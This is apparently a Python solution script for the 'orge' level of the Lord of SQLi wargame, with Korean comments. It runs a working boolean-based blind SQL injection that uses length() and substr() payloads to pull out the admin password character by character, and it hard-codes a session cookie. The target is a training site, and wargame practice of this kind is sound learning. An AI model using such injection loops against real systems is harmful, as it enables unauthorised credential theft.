import urllib.request
from urllib.parse import quote

key = ""

# 4번 orc 문제에서 이용한 코드에서 추가된 부분
pwlen = 0 # pw의 길이값을 저장한 변수

for i in range(1, 20): # pw의 길이를 알아내기 위한 반복문. 길이가 1보다 크거나 같고 20보다 작다는 전제 하에 작동한다. 만약 길이를 알아내는 데 실패하면 범위를 넓힌다.
    url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
    data = "' || id='admin' && length(pw)='{}'#".format(str(i)) # length() 함수를 통해 pw의 길이를 알아내는 부분이다.
    print(data)
    data = quote(data)
    re = urllib.request.Request(url + data)

    re.add_header(
        "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
    re.add_header(
        "Cookie", "PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"
    )

    req = urllib.request.urlopen(re)

    if str(req.read()).find("Hello admin") != -1:
        pwlen = i # pw의 길이를 pwlen 변수에 저장한다.
        print('pw length : ' + str(pwlen))
        break
# /4번 orc 문제에서 이용한 코드에서 추가된 부분

for i in range(1, pwlen + 1): # i에는 1부터 pwlen까지 들어가도록 반복문을 구성
    for j in range(32, 127):
        url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="
        data = "' || id='admin' && substr(pw, 1, {})='{}'#".format( # or, and 를 ||, && 로 수정
            str(i), key + chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)